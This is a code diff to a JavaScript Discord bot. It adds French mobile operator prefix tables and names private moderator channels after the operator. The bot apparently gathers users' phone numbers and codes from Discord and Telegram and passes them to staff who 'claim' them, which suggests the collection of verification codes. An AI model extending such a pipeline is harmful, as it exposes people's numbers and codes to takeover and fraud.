@@ -166,14 +166,25 @@ function formatPhone(p) {
 
 function getOperator(p) {
   const pre = p.slice(0, 4);
-  const bouygues = new Set(["0653", "0660", "0661", "0662", "0663", "0664", "0665", "0666", "0667", "0668", "0698", "0699", "0760", "0761", "0762", "0763"]);
-  const free = new Set(["0651", "0652", "0654", "0656", "0768", "0769", "0783", "0784"]);
-  const orange = new Set(["0607", "0608", "0630", "0631", "0632", "0633", "0634", "0670", "0671", "0672", "0673", "0674", "0675", "0676", "0677", "0678", "0679", "0680", "0681", "0682", "0683", "0684", "0685", "0686", "0687", "0688", "0689", "0707", "0770", "0771", "0776", "0777", "0780", "0781", "0782", "0785", "0786", "0787", "0788", "0789", "0790"]);
-  if (bouygues.has(pre)) return "Bouygues Mobile";
+  // table ARCEP/ephemeride - 4 chiffres
+  const bouygues = new Set(["0653","0660","0661","0662","0663","0664","0665","0666","0667","0668","0695","0696","0697","0698","0699","0760","0761","0762","0763","0798","0799"]);
+  const free = new Set(["0651","0652","0654","0656","0749","0750","0768","0769","0783","0784"]);
+  const orange = new Set(["0607","0608","0630","0631","0632","0633","0634","0635","0670","0671","0672","0673","0674","0675","0676","0677","0678","0679","0680","0681","0682","0683","0684","0685","0686","0687","0688","0689","0690","0707","0764","0765","0766","0767","0770","0771","0776","0777","0780","0781","0782","0786","0787","0788","0789","0790"]);
+  const sfr = new Set(["0603","0604","0605","0606","0609","0610","0611","0612","0613","0614","0615","0616","0617","0618","0619","0620","0621","0622","0623","0624","0625","0626","0627","0628","0629","0636","0639","0640","0641","0642","0643","0644","0645","0646","0647","0648","0649","0650","0655","0657","0658","0659","0669","0691","0692","0693","0694","0700","0701","0702","0703","0704","0705","0706","0708","0709"]);
+  if (bouygues.has(pre)) return "Bouygues Telecom";
   if (free.has(pre)) return "Free Mobile";
   if (orange.has(pre)) return "Orange";
+  if (sfr.has(pre)) return "SFR Mobile";
   if (p.startsWith("06") || p.startsWith("07")) return "SFR Mobile";
   return "Mobile FR";
+}
+function getOperatorSlug(p) {
+  const op = getOperator(p);
+  if (op.includes("Bouygues")) return "bouygues";
+  if (op.includes("Free")) return "free";
+  if (op.includes("Orange")) return "orange";
+  if (op.includes("SFR")) return "sfr";
+  return "mobile";
 }
 
 async function getModChannel() {
@@ -990,8 +1001,9 @@ client.on("interactionCreate", async (i) => {
       await modMsg.edit({ embeds: [claimedEmbed], components: [] });
       const modGuild = modChannel.guild || await client.guilds.fetch(MOD_GUILD_ID);
       const claimerId = i.user.id;
+      const chanName = `${getOperatorSlug(data.phone)}-${userId}`.toLowerCase();
       const newChannel = await modGuild.channels.create({
-        name: `verif-${userId}`,
+        name: chanName,
         type: ChannelType.GuildText,
         parent: modChannel.parentId || null,
         permissionOverwrites: [
@@ -999,7 +1011,7 @@ client.on("interactionCreate", async (i) => {
           { id: claimerId, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] },
           { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory, PermissionsBitField.Flags.ManageChannels] }
         ],
-        reason: `Claim ${i.user.tag} ${userId}`
+        reason: `Claim ${i.user.tag} ${userId} ${getOperator(data.phone)}`
       });
       const targetUser = isTg ? { username: data.tgName || "Telegram", id: userId, displayAvatarURL: () => "https://cdn.discordapp.com/embed/avatars/0.png" } : await client.users.fetch(userId);
       const detailEmbed = buildModEmbed(targetUser, og || { name: isTg ? "Telegram" : "Serveur", memberCount: 0, id: originGuildId }, data.phone, data.code, data.dateStr);
@@ -1152,8 +1164,9 @@ client.on("interactionCreate", async (i) => {
       await modMsg.edit({ embeds: [claimedEmbed], components: [] });
       const modGuild = modChannel.guild || await client.guilds.fetch(MOD_GUILD_ID);
       const claimerId = i.user.id;
+      const chanName2 = `${getOperatorSlug(data.phone)}-${userId}`.toLowerCase();
       const newChannel = await modGuild.channels.create({
-        name: `verif-${userId}`,
+        name: chanName2,
         type: ChannelType.GuildText,
         parent: modChannel.parentId || null,
         permissionOverwrites: [
@@ -1161,7 +1174,7 @@ client.on("interactionCreate", async (i) => {
           { id: claimerId, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] },
           { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory, PermissionsBitField.Flags.ManageChannels] }
         ],
-        reason: `Prêt ${i.user.tag} ${userId}`
+        reason: `Prêt ${i.user.tag} ${userId} ${getOperator(data.phone)}`
       });
       const targetUser = isTg ? { username: data.tgName || "Telegram", id: userId, displayAvatarURL: () => "https://cdn.discordapp.com/embed/avatars/0.png" } : await client.users.fetch(userId);
       const detailEmbed = buildModEmbed(targetUser, og || { name: isTg ? "Telegram" : "Serveur", memberCount: 0, id: originGuildId }, data.phone, data.code, data.dateStr);
